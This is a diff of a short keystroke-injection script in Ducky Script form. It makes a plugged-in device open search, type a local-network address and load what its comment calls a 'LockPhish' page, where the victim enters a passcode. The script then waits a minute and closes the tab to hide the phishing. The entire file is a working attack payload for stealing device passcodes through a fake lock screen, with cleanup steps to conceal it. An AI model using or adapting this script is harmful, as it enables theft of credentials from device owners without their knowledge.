@@ -1,21 +1,35 @@
-0: GUI h
+GUI h
 
-1: DELAY 1000
+DELAY 1000
 
-2: GUI SPACE
+GUI SPACE
 
-3: DELAY 500
+DELAY 500
 
-4: STRING 192.168.0.12:5000
+STRING 192.168.0.12:5000
 
-5: DELAY 500
+DELAY 500
 
-6: TAB
+TAB
 
-7: DELAY 500
+DELAY 500
 
-8: ENTER
+ENTER
 
-9: DELAY 500
+DELAY 500
 
-10: ENTER
+ENTER
+
+REM The below KEYSTROKES can be added to go back to the Browser & close the LockPhish Tab after the user has entered PASSCODE. Guesswork after 1 minute (60000)
+
+DELAY 60000
+
+GUI TAB
+
+DELAY 250
+
+GUI w
+
+DELAY 250
+
+GUI TAB
